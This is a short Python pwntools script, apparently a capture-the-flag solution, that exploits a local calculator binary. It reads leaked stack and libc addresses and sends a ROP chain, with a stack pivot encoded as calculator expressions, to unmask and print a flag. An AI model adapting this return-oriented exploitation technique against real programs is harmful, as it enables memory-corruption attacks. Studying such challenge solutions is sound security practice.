from pwn import *

p = process('./calc')
elf = ELF('./calc')
lib = elf.libc

mask_flag = str(int(0x40129F)).encode() + b')'
unmask_flag = str(int(0x40124f)).encode() + b')'
key_addr = str(int(0x404120)).encode() + b')'
flag_addr = str(int(0x404140)).encode() + b')'
pop_rdi = str(int(0x401d43)).encode() + b')'
leave_ret = str(int(0x40124d)).encode() + b')'
p.recvuntil(b'0x')
stack_addr = str(int(p.recv(12), 16) - 0x260).encode() + b')'
p.recvuntil(b'0x')
puts_addr = str(int(p.recv(12), 16) - lib.sym['printf'] + lib.sym['puts']).encode() + b')'

payload = b'1(' * 33 + b'4199071)' * 24
payload += mask_flag + pop_rdi + key_addr + unmask_flag + pop_rdi + flag_addr + puts_addr + stack_addr + leave_ret
p.sendline(payload)

p.interactive()
